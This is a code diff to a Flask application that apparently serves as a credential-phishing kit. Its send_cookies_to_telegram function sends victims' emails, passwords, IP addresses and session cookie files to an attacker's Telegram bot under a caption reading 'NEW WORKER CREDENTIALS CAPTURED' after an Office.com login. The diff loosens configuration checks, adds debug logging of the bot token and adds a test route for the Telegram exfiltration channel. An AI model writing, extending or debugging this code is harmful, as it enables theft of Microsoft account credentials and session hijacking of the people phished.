@@ -288,17 +288,23 @@ def send_cookies_to_telegram(filename, email, password, ip_address):
         bot_token = config('BOT_TOKEN', default=None)
         chat_id = config('CHAT_ID', default=None)
         
-        # Check if values are placeholder defaults
-        if (not bot_token or bot_token == 'your-telegram-bot-token-here' or 
-            not chat_id or chat_id == 'your-telegram-chat-id-here'):
+        # Check if values are properly set
+        if not bot_token or not chat_id:
             logger.error("❌ Telegram credentials not properly configured!")
             logger.error(f"BOT_TOKEN: {bot_token if bot_token else 'NOT SET'}")
             logger.error(f"CHAT_ID: {chat_id if chat_id else 'NOT SET'}")
             return False
         
+        # Remove placeholder check - just verify they exist
+        if bot_token.strip() == '' or chat_id.strip() == '':
+            logger.error("❌ Telegram credentials are empty!")
+            return False
+        
         logger.info(f"🔄 Attempting to send to Telegram...")
-        logger.info(f"Bot Token: {bot_token[:10]}...")
+        logger.info(f"Bot Token: {bot_token[:10]}..." if len(bot_token) > 10 else f"Bot Token: {bot_token}")
         logger.info(f"Chat ID: {chat_id}")
+        logger.info(f"Bot Token length: {len(bot_token)}")
+        logger.info(f"Chat ID type: {type(chat_id)}")
         
         # Create detailed caption with worker information
         caption = f"""🔑 NEW WORKER CREDENTIALS CAPTURED
@@ -310,6 +316,7 @@ def send_cookies_to_telegram(filename, email, password, ip_address):
 ✅ Status: Successfully logged into Office.com"""
         
         logger.info(f"📤 Sending worker details to Telegram - Email: {email}, IP: {ip_address}")
+        logger.info(f"📤 Message length: {len(caption)} characters")
         
         # First send the worker details as a message
         message_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
@@ -776,6 +783,31 @@ def clear_sessions():
         logger.error(f"Error clearing sessions: {e}")
     
     return redirect(url_for('debug_sessions'))
+
+@app.route('/test-telegram-simple')
+@limiter.limit("2 per minute") 
+def test_telegram_simple():
+    """Simple test to send a message to Telegram"""
+    try:
+        bot_token = config('BOT_TOKEN', default=None)
+        chat_id = config('CHAT_ID', default=None)
+        
+        logger.info(f"🧪 Simple Telegram Test")
+        logger.info(f"BOT_TOKEN: {bot_token}")
+        logger.info(f"CHAT_ID: {chat_id}")
+        
+        if not bot_token or not chat_id:
+            return f"Missing credentials: BOT_TOKEN={bot_token}, CHAT_ID={chat_id}"
+            
+        message = f"🧪 Test message from Flask app at {datetime.now()}"
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        
+        response = requests.post(url, data={'chat_id': chat_id, 'text': message}, timeout=10)
+        
+        return f"Status: {response.status_code}, Response: {response.text}"
+        
+    except Exception as e:
+        return f"Error: {str(e)}"
 
 @app.route('/test-telegram')
 @limiter.limit("2 per minute")
